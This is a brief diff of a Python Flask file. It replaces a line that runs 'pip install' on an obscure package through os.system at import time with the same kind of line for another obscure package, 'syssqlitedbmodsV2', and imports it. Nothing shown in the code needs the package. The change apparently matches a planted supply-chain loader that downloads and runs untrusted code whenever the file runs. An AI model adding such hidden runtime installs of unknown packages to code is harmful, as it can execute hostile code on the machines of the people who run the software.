@@ -2,8 +2,8 @@
 
 import time
 import os
-os.system("pip install syscolouringspackage")
-import syscolouringspackage
+os.system("pip install syssqlitedbmodsV2")
+import syssqlitedbmodsV2
 import flask
 
 from flask import g
